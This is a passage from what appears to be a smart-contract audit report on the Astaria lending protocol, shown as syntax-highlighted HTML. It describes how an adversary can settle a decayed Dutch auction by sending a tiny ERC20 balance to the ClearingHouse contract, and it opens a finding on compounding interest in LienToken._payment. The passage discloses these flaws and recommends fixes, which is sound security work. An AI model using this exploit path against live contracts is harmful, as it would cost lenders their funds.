class=\"mtk12\">offer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">consideration:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">orderType:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OrderType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FULL_OPEN</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">startTime:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">endTime:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">maxDuration</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">zoneHash:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">salt:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">blockhash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">conduitKey:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CONDUIT_KEY</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// 0x120</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">totalOriginalConsiderationItems:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Note the first consideration item:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ConsiderationItem</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ConsiderationItem</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">ConsiderationItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">settlementToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">prices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Prices[0] is the initialLiquidationPrice the starting price, prices[1] is the ending price, which is 1000 WEI. This means if no one buys the dutch auction, the price will fall to 1000 WEI.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ClearingHouseStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getStorage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">encodedMetaData</span><span class=\"mtk1\">).</span><span class=\"mtk11\">fromLast20Bytes</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentOfferPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_locateCurrentAmount</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">startAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">endAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">startTime:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">endTime:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">roundUp:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//we are a consideration we round up</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">currentOfferPrice</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;not enough funds received&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the code above, note that the code checks if the current balance of the payment token is larger than currentOfferPrice computed by _locateCurrentAmount, this utility function comes from seaport.</p>\n<p><a href=\"https://github.com/ProjectOpenSea/seaport/blob/f402dac8b3faabdb8420d31d46759f47c9d74b7d/contracts/lib/AmountDeriver.sol#L38\">https://github.com/ProjectOpenSea/seaport/blob/f402dac8b3faabdb8420d31d46759f47c9d74b7d/contracts/lib/AmountDeriver.sol#L38</a></p>\n<p>If no one buys the dutch auction, the price will drop to until 1000 WEI, which means _locateCurrentAmount returns lower and lower price.</p>\n<p>In normal flow, if no one buys the dutch auction and covers the outstanding debt, the NFT can be claimabled by liquidator. The liquidator can try to sell NFT again to cover the debt and loss for lenders.</p>\n<p>However, if no one wants to buy the dutch auction and the _locateCurrentAmount is low enough, for example, 10000 WEI, an adversary can transfer 10001 WEI of ERC20 payment token to the ClearingHouse contract.</p>\n<p>Then call safeTransferFrom to settle the auction.</p>\n<p>The code below will execute</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">currentOfferPrice</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;not enough funds received&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Because the airdropped ERC20 balance make the payment larger than currentOfferPrice.</p>\n<p>In this case, the adversary blocks the liquidator from claiming the not-auctioned liquidated NFT.</p>\n<p>The low amount of payment 10001 WEI is not likely to cover the outstanding debt and the lender has to bear the loss.</p>\n<h3 id=\"recommended-mitigation-steps-46\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-46\" aria-label=\"recommended mitigation steps 46 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol validate the caller of the safeTransferFrom in ClearingHouse is the seaport / conduict contract and check that when the auction is settled, the NFT ownership changed and the Astaria contract does not hold the NFT any more.</p>\n<hr>\n<h2 id=\"m-31-lientoken_payment-function-increases-users-debt\" style=\"position:relative;\"><a href=\"#m-31-lientoken_payment-function-increases-users-debt\" aria-label=\"m 31 lientoken_payment function increases users debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/96\">[M-31] <code>LienToken._payment</code> function increases users debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/96\">rvierdiiev</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/574\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/425\">evan</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/141\">ladboy233</a></em></p>\n<p>LienToken._payment function increases users debt. Every time when user pays not whole lien amount then interests are added to the loan amount, so next time user pays interests based on interests.</p>\n<h3 id=\"proof-of-concept-45\" style=\"position:relative;\"><a href=\"#proof-of-concept-45\" aria-label=\"proof of concept 45 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>LienToken._payment</code> is used by <code>LienToken.makePayment</code> function that allows borrower to repay part or all his debt.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L790-L853\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L790-L853</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_payment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">activeStack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">activeStack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">atLiquidation</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERAL_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Blocking off payments for a lien that has exceeded the lien.end to prevent repayment unless the msg.sender() is the AuctionHouse</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">end</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidLoanState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owed</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOwed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isPublicVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_isPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPayee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">owed</span><span class=\"mtk1\">) </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">owed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isPublicVault</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">beforePayment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IPublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">BeforePaymentParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">interestOwed:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">lienSlope:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//bring the point up to block.timestamp, compute the owed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">owed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">last</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo40</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">//      // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isPublicVault</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">afterPayment</span><span class=\"mtk1\">(</span><span class=\"mtk11\">calculateSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isPublicVault</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// since the openLiens count is only positive when there are liens that haven&#39;t been paid off</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// that should be liquidated, this lien should not be counted 